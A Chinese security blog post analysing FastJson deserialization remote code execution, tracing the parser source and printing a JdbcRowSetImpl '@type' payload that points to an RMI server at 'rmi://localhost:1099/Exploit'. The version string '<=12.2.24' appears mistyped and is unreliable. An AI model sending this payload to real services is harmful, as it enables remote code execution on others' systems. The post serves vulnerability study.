<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="概述由于本篇是FastJson反序列化的第一篇，所以我尽量写的详细些，通过阅读本篇你将了解到：  FastJson反序列化到RCE的原因&#x2F;原理； 通过实例说明FastJson反序列化的三种方式、使用和区别 通过FastJson反序列化到RCE的详细代码跟踪，了解其详细过程； FastJson反序列化第一个漏洞剖析，&lt;&#x3D;12.2.24  FastJson反序列化原理和Weblogic T3反序">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson&#x2F;FastJson反序列化过程拆解">
<meta property="og:url" content="http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/index.html">
<meta property="og:site_name" content="Homer&#39;s blog">
<meta property="og:description" content="概述由于本篇是FastJson反序列化的第一篇，所以我尽量写的详细些，通过阅读本篇你将了解到：  FastJson反序列化到RCE的原因&#x2F;原理； 通过实例说明FastJson反序列化的三种方式、使用和区别 通过FastJson反序列化到RCE的详细代码跟踪，了解其详细过程； FastJson反序列化第一个漏洞剖析，&lt;&#x3D;12.2.24  FastJson反序列化原理和Weblogic T3反序">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-04-10T15:28:24.624Z">
<meta property="article:modified_time" content="2020-04-10T15:28:24.625Z">
<meta property="article:author" content="Homer">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo1.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo1.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo1.png">
          
        
    
    <!-- title -->
    <title>fastjson/FastJson反序列化过程拆解</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/homerqing" target="_blank" rel="noopener">Github</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/04/10/weblogic/CVE-2020-2555%E5%88%86%E6%9E%90/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&text=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&is_video=false&description=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson/FastJson反序列化过程拆解&body=Check out this article: http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&title=fastjson/FastJson反序列化过程拆解" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/&name=fastjson/FastJson反序列化过程拆解&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson反序列化原理"><span class="toc-number">2.</span> <span class="toc-text">FastJson反序列化原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson中序列化和反序列化的方法"><span class="toc-number">3.</span> <span class="toc-text">FastJson中序列化和反序列化的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试过程"><span class="toc-number">4.</span> <span class="toc-text">调试过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#进入反序列化的过程"><span class="toc-number">5.</span> <span class="toc-text">进入反序列化的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lt-12-2-24"><span class="toc-number">6.</span> <span class="toc-text">&lt;&#x3D;12.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备："><span class="toc-number">6.1.</span> <span class="toc-text">环境准备：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        fastjson/FastJson反序列化过程拆解
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Homer's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-04-10T15:28:24.624Z" itemprop="datePublished">2020-04-10</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>由于本篇是FastJson反序列化的第一篇，所以我尽量写的详细些，通过阅读本篇你将了解到：</p>
<ol>
<li>FastJson反序列化到RCE的原因/原理；</li>
<li>通过实例说明FastJson反序列化的三种方式、使用和区别</li>
<li>通过FastJson反序列化到RCE的详细代码跟踪，了解其详细过程；</li>
<li>FastJson反序列化第一个漏洞剖析，&lt;=12.2.24</li>
</ol>
<h2 id="FastJson反序列化原理"><a href="#FastJson反序列化原理" class="headerlink" title="FastJson反序列化原理"></a>FastJson反序列化原理</h2><p>和Weblogic T3反序列化利用ReadObject()不同的是FastJson反序列化过程利用的是反射调用被反序列化类中实现的setXXX()和getXXX()方法。  </p>
<p>如下在<code>com.sun.rowset:JdbcRowSetImpl()</code>中的<code>setAutoCommit</code>方法中，会远程连接RMI Server，如果我们反序列化<code>JdbcRowSetImpl</code>并触发<code>setAutoCommit()方法</code>（实际还需要<code>setDataSourceName()</code>方法），则会使得服务端产生一个RMI连接。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以FastJson反序列化漏洞需要满足以下条件：</p>
<ol>
<li>被反序列化类种存在set和get方法，并且能够满足RCE的需求；</li>
<li>发送的json数据能够被反序列化，并能够执行被反序列化类种的set、get方法。</li>
</ol>
<h2 id="FastJson中序列化和反序列化的方法"><a href="#FastJson中序列化和反序列化的方法" class="headerlink" title="FastJson中序列化和反序列化的方法"></a>FastJson中序列化和反序列化的方法</h2><p>对于开发者而言，FastJson提供的序列化和反序列化方法使用很简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">Object test = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">Object test = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">Object test = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, TEST<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//JSON文本解析成TEST.class类</span></span><br></pre></td></tr></table></figure>
<p>以上三个不同的反序列化方式在解析JSON字符串的代码流程上会有所不同，本文不会分别对它们的代码流程进行跟踪，关于这三个方法的区别在<code>参考2</code>中写的非常详细，本文不再叙述。</p>
<p>上面是开发者视角的三个可以实现反序列化的方法，对于攻击者视角如果想要利用FastJson反序列化执行RCE，则需要能够控制反序列化的类以及上文提到的该类中的setXXX()和getXXX()方法。FastJson提供了一个<code>@type</code>参数，通过<code>@type</code>参数我们可以让FastJson反序列化我们指定的类，这为RCE提供了前提，如<code>&lt;=12.2.24</code>使用的payload为：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;利用JDK原生模块，创建RMI连接，后续的原理和 Weblogic IIOP-RMI CVE-2020-2551相同</span><br><span class="line">&#123;</span><br><span class="line">    &#39;@type&#39;: &#39;com.sun.rowset.JdbcRowSetImpl&#39;,</span><br><span class="line">    &#39;dataSourceName&#39;: &#39;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&#39;,</span><br><span class="line">    &#39;autoCommit&#39;: &#39;true&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>我们首先实现一个HTTP服务器，然后用fastjson库对POST的json数据进行解析：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket ss=<span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">                Socket socket=ss.accept();</span><br><span class="line">                BufferedReader bd=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</span><br><span class="line">                <span class="comment">//接受HTTP请求</span></span><br><span class="line">                String requestHeader;</span><br><span class="line">                <span class="keyword">int</span> contentLength=<span class="number">0</span>;</span><br><span class="line">                StringBuffer sb=<span class="keyword">new</span> StringBuffer();</span><br><span class="line">                <span class="comment">//获取POST body，并通过fastjson进行解析</span></span><br><span class="line">                <span class="keyword">if</span>(contentLength&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; contentLength; i++) &#123;</span><br><span class="line">                        sb.append((<span class="keyword">char</span>)bd.read());</span><br><span class="line">                    &#125;</span><br><span class="line">                    Student jsonObject = JSON.parseObject(String.valueOf(sb), Student<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    System.out.println(jsonObject);</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进入反序列化的过程"><a href="#进入反序列化的过程" class="headerlink" title="进入反序列化的过程"></a>进入反序列化的过程</h2><p>下文将详细跟踪<code>Object test = JSON.parseObject(&quot;{...}&quot;);</code>的反序列化过程。</p>
<p>首先会通过<code>parse()</code>方法对提交的json数据进行解析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>parse()</code>中初始化了<code>DefaultJSONParser</code>，之后调用了<code>DefaultJSONParser</code>的<code>parse</code>方法进行后续的操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//这里初始化了DefaultJSONParser</span></span><br><span class="line">            DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">            <span class="comment">//之后调用了DefaultJSONParser的parse方法进行后续的操作</span></span><br><span class="line">            Object value = parser.parse();</span><br><span class="line">            parser.handleResovleTask(value);</span><br><span class="line">            parser.close();</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>DefaultJSONParser</code>中会初始化lexer，input为我们提交的json数据，由于我们提交的数据是由<code>{</code>开始的，所以经过<code>if</code>判断后，<code>lexer.token</code>被设置为12。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DefaultJSONParser</span><span class="params">(Object input, JSONLexer lexer, ParserConfig config)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;</span><br><span class="line">    <span class="keyword">this</span>.contextArrayIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.resolveStatus = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.extraTypeProviders = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.extraProcessors = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.fieldTypeResolver = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.lexer = lexer;</span><br><span class="line">    <span class="keyword">this</span>.input = input;</span><br><span class="line">    <span class="keyword">this</span>.config = config;</span><br><span class="line">    <span class="keyword">this</span>.symbolTable = config.symbolTable;</span><br><span class="line">    <span class="keyword">int</span> ch = lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase)lexer).token = <span class="number">12</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'['</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase)lexer).token = <span class="number">14</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码随后进入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object value = parser.parse();</span><br></pre></td></tr></table></figure>
<p>在<code>parse()</code>中会根据<code>lexer.token</code>进入不同的解析流程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(Object fieldName)</span> </span>&#123;</span><br><span class="line">    JSONLexer lexer = <span class="keyword">this</span>.lexer;</span><br><span class="line">    <span class="keyword">switch</span>(lexer.token()) &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.parseObject((Map)object, fieldName);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>com.alibaba.fastjson.parser.DefaultJSONParser:parseObject</code>中，将遍历传入的Json数据，并解析出<code>@type</code>字段的<code>key</code>和<code>value</code>，并调用<code>derializer</code>对<code>@type</code>的值进行反序列化。这里代码比较长，只放关键代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//解析出@type，此时key为"@type"</span></span><br><span class="line">key = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line"><span class="comment">//获取@type的值，此时ref为"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">ref = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line"><span class="comment">//加载类，获取默认的加载器对类进行加载，此时clazz为经过加载的"com.sun.rowset.JdbcRowSetImpl"类</span></span><br><span class="line">clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br><span class="line"><span class="comment">//获取类的解析器</span></span><br><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>在初始化解析器过程中，首先会尝试在<code>deserializers</code>中匹配<code>type</code>的类型，如果匹配到了就返回匹配的<code>derializer</code>，否则就判断是否是Class泛型的接口，如果是则调用getDeserializer((Class&lt;?&gt;) type, type)继续处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Type type)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//首先会尝试在`deserializers`中匹配`type`的类型，如果匹配到了就返回匹配的derializer</span></span><br><span class="line">    ObjectDeserializer derializer = (ObjectDeserializer)<span class="keyword">this</span>.derializers.get(type);</span><br><span class="line">    <span class="keyword">if</span> (derializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> derializer;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">        <span class="comment">//否则就判断是否是Class泛型的接口，如果是则调用getDeserializer((Class&lt;?&gt;) type, type)继续处理</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">        Type rawType = ((ParameterizedType)type).getRawType();</span><br><span class="line">        <span class="keyword">return</span> rawType <span class="keyword">instanceof</span> Class ? <span class="keyword">this</span>.getDeserializer((Class)rawType, type) : <span class="keyword">this</span>.getDeserializer(rawType);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaObjectDeserializer.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>getDeserializer(Class&lt;?&gt; clazz, Type type)</code>中，会继续获取derializers，这里传入的clazz和type都是我们通过<code>@type</code>指定的<code>com.sun.rowset.JdbcRowSetImpl</code>类，这里代码很长，最后会进入<code>createJavaBeanDeserializer</code>，创建一个新的<code>derializer</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">getDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    derializer = <span class="keyword">this</span>.createJavaBeanDeserializer(clazz, (Type)type);</span><br><span class="line">    <span class="keyword">this</span>.putDeserializer((Type)type, (ObjectDeserializer)derializer);</span><br><span class="line">    <span class="keyword">return</span> (ObjectDeserializer)derializer;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里首先会根据类名和<code>propertyNamingStrategy</code>生成<code>beanInfo</code>，之后利用<code>asm</code>工厂类的<code>createJavaBeanDeserializer</code>生成处理类:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(Class&lt;?&gt; clazz, Type type)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    beanInfo = JavaBeanInfo.build(clazz, type, <span class="keyword">this</span>.propertyNamingStrategy);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.asmFactory.createJavaBeanDeserializer(<span class="keyword">this</span>, beanInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS: 在<code>build</code>方法中将循环类中的每个方法，并识别是否以<code>set</code>或<code>get</code>开头：</p>
